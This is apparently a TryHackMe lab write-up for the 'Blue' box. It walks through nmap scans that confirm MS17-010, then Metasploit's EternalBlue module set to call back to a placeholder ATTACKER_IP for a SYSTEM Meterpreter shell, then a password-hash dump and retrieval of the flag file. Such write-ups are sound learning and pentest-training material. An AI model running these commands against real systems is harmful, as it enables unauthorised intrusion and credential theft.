# Blue

**Platform:** TryHackMe
**OS:** Windows
**Tags:** MS17-010, EternalBlue, Metasploit, SMB, SYSTEM
**Date:** 2026-05-04

Windows box vulnerable to EternalBlue (MS17-010). Metasploit's SMBv1 exploit gives a direct SYSTEM shell.

## 1. Initial Enumeration

A service and script scan was run against the target to identify open ports and running services.

```bash
nmap -sV -sC <TARGET_IP>
```

Findings:
- 445/tcp - SMB open, NetBIOS services exposed
- OS: Windows 7 Professional SP1 x64
- SMB Signing: Disabled. Classic indicator of MS17-010 potential.

## 2. SMB Vulnerability Enumeration

With SMB open and signing disabled, ran targeted NSE scripts to confirm the MS17-010 vulnerability.

```bash
nmap --script=smb-vuln-ms17-010 <TARGET_IP>
```

**Result:** Target confirmed vulnerable to MS17-010 (CVE-2017-0143). Risk: Critical. Exploitable via SMBv1.

## 3. Exploitation: EternalBlue

Used Metasploit's EternalBlue module to exploit the SMBv1 vulnerability and get a shell.

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
exploit
```

**Result:** Meterpreter session established. Running as NT AUTHORITY\SYSTEM. No privilege escalation needed.

## 4. Post-Exploitation

With a SYSTEM shell, dumped password hashes and retrieved flags.

```
hashdump
shell
type C:\Users\Administrator\Desktop\root.txt
```

Key Takeaway: MS17-010 (EternalBlue) directly returns SYSTEM on unpatched Windows 7/Server 2008 machines via SMBv1. Always check for this on old Windows targets. It's still common in internal network pentests.
